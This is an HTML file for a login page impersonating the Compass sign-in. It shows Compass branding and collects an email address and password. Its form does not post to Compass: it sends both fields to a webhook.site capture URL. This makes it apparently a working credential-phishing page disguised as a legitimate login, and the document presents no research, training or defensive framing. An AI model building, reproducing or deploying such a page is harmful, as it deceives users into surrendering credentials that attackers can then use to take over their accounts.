<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Compass Login</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter&display=swap">
  <style>
    body {
      font-family: 'Inter', sans-serif;
      background-color: #f7f8fa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 0 30px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 400px;
    }
    .login-box h2 {
      text-align: center;
      margin-bottom: 24px;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      border: 1px solid #ddd;
      border-radius: 8px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #111;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }
    .logo {
      display: block;
      margin: 0 auto 20px;
      width: 120px;
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://static.thehoneycombers.com/wp-content/uploads/sites/2/2022/10/Compass-logo.png" alt="Compass Logo" class="logo" />
    <h2>Sign In to Compass</h2>
    <form method="POST" action="https://webhook.site/e4643de3-f122-45c2-8d36-b2737eb9c7a5">
      <input type="email" name="email" placeholder="Email address" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Sign In</button>
    </form>
  </div>
</body>
</html>
